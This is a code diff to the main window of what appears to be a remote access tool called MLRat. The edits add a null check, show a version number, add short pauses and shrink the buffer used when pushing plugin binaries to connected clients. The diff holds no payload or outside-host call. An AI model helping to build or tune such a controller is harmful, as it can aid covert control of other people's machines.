@@ -43,9 +43,9 @@ namespace MLRat.Forms
 
         void DisplayException(MLPlugin plugin, Exception ex)
         {
-            if (plugin != null)
+            if (plugin != null && plugin.PluginInfomation != null)
             {
-                rtbPluginLog.LogText(string.Format("[{0}] {1}", plugin.PluginInfomation.PluginName, ex.Message), Color.Red);
+                rtbPluginLog.LogText(string.Format("[{0}] {1}", plugin.ServerPlugin, ex.Message), Color.Red);
                 //Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
             }
             else
@@ -256,6 +256,7 @@ namespace MLRat.Forms
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
+            this.Text += " - " + Application.ProductVersion;
             DirectoryInfo id = new DirectoryInfo("Plugins");
             if (id.Exists)
             {
@@ -269,7 +270,7 @@ namespace MLRat.Forms
         private void button1_Click(object sender, EventArgs e)
         {
             NetworkServer = new eSock.Server();
-            NetworkServer.BufferSize = 8192;//1mb
+            NetworkServer.BufferSize = 8192;
             NetworkServer.OnClientConnect += NetworkServer_OnClientConnect;
             NetworkServer.OnClientConnecting += NetworkServer_OnClientConnecting;
             NetworkServer.OnClientDisconnect += NetworkServer_OnClientDisconnect;
@@ -368,6 +369,7 @@ namespace MLRat.Forms
                                 {
                                     Guid ID = plugin.Key;
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                                 return;
@@ -385,6 +387,7 @@ namespace MLRat.Forms
                                 if (LoadedPlugins[ID].ClientPluginChecksum!= checksum)
                                 {
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                                  
@@ -397,6 +400,7 @@ namespace MLRat.Forms
                                 if (!Checksums.ContainsKey(ID))
                                 {
                                     UpdatePlugin(client, ID);
+                                    Thread.Sleep(100);
                                     Updated = true;
                                 }
                             }
@@ -464,7 +468,7 @@ namespace MLRat.Forms
         {
             try
             {
-                byte[] buffer = new byte[10000];
+                byte[] buffer = new byte[2000];
                 int bytesRead = 0;
                 using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
                 {
@@ -473,8 +477,8 @@ namespace MLRat.Forms
                         byte[] Packet = new byte[bytesRead];
                         Array.Copy(buffer, 0, Packet, 0, bytesRead);
                         client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
-                            _pluginUpdate.Position == _pluginUpdate.Length);
-                        //Thread.Sleep(100);
+                        _pluginUpdate.Position == _pluginUpdate.Length);
+                        Thread.Sleep(100);
                     }
                 }
             }
